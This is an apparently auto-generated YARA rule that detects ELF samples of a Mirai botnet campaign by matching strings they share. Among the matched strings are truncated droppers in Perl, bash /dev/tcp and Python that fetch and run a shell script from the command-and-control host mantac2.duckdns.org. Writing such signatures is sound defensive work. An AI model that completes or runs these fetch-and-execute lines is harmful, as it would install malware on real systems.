rule Sightlines_tlsh_192d571d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-192d571d"
        date = "2026-10-29"
        campaign = "tlsh-192d571d"
        family = "mirai"
        hash = "865dd7bc61ba754ef5c8bc0452ae66385ae5b1bc78f90caa85d9f2b973ce497d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-192d571d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3551368 and 12 of them
}
